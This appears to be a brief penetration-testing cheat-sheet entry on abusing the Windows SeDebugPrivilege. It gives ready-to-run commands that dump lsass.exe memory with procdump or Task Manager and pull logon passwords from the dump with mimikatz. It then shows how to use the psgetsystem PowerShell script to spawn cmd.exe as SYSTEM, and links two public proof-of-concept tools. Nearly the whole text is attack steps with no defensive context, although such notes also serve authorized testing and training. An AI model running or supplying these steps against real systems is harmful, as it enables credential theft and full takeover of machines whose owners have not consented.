SeDebugPrivilege allows debugging. You have access to critical system memory.

```
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```
- Make sure lsass.dmp is in the same directory as mimikatz.exe

Also can dump via Task Manager:
Task Manager -> Details -> lsass.exe -> Create dump file

## Remote Code Execution as SYSTEM
https://github.com/decoder-it/psgetsystem

1. Transfer psgetsystem.ps1 to target
2. Run powershell as administrator
3. ```
   tasklist 
   .\psgetsystem.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>,"")
   .\psgetsystem.ps1; [MyProcess]::CreateProcessFromParent(612,"c:\Windows\System32\cmd.exe","")
   ```
4. Find a PID that is running as SYSTEM, like winlogon.exe
5. We can also use (Get-Process "lsass").Id instead of the pid


Another example: https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC
